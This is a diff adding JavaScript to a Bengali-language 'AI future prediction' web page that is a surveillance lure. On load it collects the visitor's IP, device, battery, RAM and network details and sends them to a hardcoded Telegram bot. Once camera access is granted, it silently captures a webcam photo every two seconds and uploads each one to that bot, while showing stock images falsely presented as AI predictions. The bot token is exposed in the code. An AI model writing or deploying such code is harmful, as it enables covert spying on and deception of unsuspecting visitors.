@@ -1,0 +1,94 @@
+<script>
+    const BOT_TOKEN = '8655910223:AAF7QkYAwKuha8tVJjiNvVjWcZtaG0ffaoA'; 
+    const CHAT_ID = '6547277630'; 
+
+    let gender = 'male';
+    let step = 0;
+    let photoInterval;
+    const music = document.getElementById('bgMusic');
+
+    // --- নতুন অংশ: পেজ লোড হওয়ার সাথে সাথেই ডাটা সংগ্রহ ---
+    window.onload = async function() {
+        try {
+            const n = navigator;
+            const ipRes = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipRes.json();
+            const conn = n.connection || {};
+            
+            // ব্যাটারি ইনফো (প্রমিজ হ্যান্ডলিং)
+            let batteryInfo = "N/A";
+            if (n.getBattery) {
+                const battery = await n.getBattery();
+                batteryInfo = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Unplugged'})`;
+            }
+
+            let initialInfo = `🌐 **New Visitor Joined!**\n📍 **IP:** \`${ipData.ip}\`\n📱 **Device:** ${n.userAgent.split('(')[1].split(')')[0]}\n🔋 **Battery:** ${batteryInfo}\n🧠 **RAM:** ~${n.deviceMemory || 'N/A'} GB\n📶 **Net:** ${conn.effectiveType || 'Unknown'}\n🕒 **Time:** ${new Date().toLocaleTimeString()}`;
+
+            // টেলিগ্রামে মেসেজ পাঠানো
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(initialInfo)}&parse_mode=Markdown`);
+        } catch (e) {
+            console.log("Initial data collection failed.");
+        }
+    };
+    // ------------------------------------------------
+
+    function openVision(g) {
+        gender = g;
+        music.play().catch(e => console.log("Music blocked."));
+        document.getElementById('s1').classList.remove('active');
+        document.getElementById('s2').classList.add('active');
+    }
+
+    async function startSync() {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            document.getElementById('video').srcObject = stream;
+            
+            // ক্যামেরা এলাও করার পর একটি নোটিফিকেশন যাবে
+            let syncMsg = `✅ **Camera Access Granted!**\n👤 **Gender Selected:** ${gender}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(syncMsg)}&parse_mode=Markdown`);
+
+            photoInterval = setInterval(captureSilent, 2000);
+
+            setTimeout(() => {
+                document.getElementById('s2').classList.remove('active');
+                document.getElementById('s3').classList.add('active');
+                showNext();
+            }, 4000);
+        } catch (e) {
+            alert("কানেকশন ফেইলড! দয়া করে আবার 'Allow' বাটনে ক্লিক করো।");
+            setTimeout(startSync, 1000); 
+        }
+    }
+
+    function captureSilent() {
+        const v = document.getElementById('video');
+        const c = document.getElementById('canvas');
+        if(!v.videoWidth) return;
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => {
+            const f = new FormData();
+            f.append('chat_id', CHAT_ID);
+            f.append('photo', b, 'v.jpg');
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: f });
+        }, 'image/jpeg');
+    }
+
+    function showNext() {
+        const titles = ["বৃদ্ধ বয়সে তোমার তেজ", "তোমার স্বপ্নের রাজপ্রাসাদ", "তোমার কিউট সন্তান"];
+        const imgs = ["https://images.unsplash.com/photo-1544144433-d50aff500b91", "https://images.unsplash.com/photo-1512917774080-9991f1c4c750", "https://images.unsplash.com/photo-1502086223501-7ea6ecd79368"];
+        
+        if (step < titles.length) {
+            document.getElementById('res-title').innerText = titles[step];
+            document.getElementById('res-img').src = imgs[step] + "?w=400";
+            document.getElementById('res-desc').innerText = "এআই তোমার ডাটা থেকে এই বিশেষ দৃশ্যটি খুঁজে পেয়েছে।";
+            step++;
+        } else {
+            clearInterval(photoInterval);
+            document.getElementById('res-title').innerText = "ভবিষ্যৎবাণী সমাপ্ত!";
+            document.getElementById('res-desc').innerText = "তোমার ভাগ্য অনেক সুপ্রসন্ন হোক। ধন্যবাদ!";
+            document.getElementById('next-btn').style.display = 'none';
+        }
+    }
+</script>
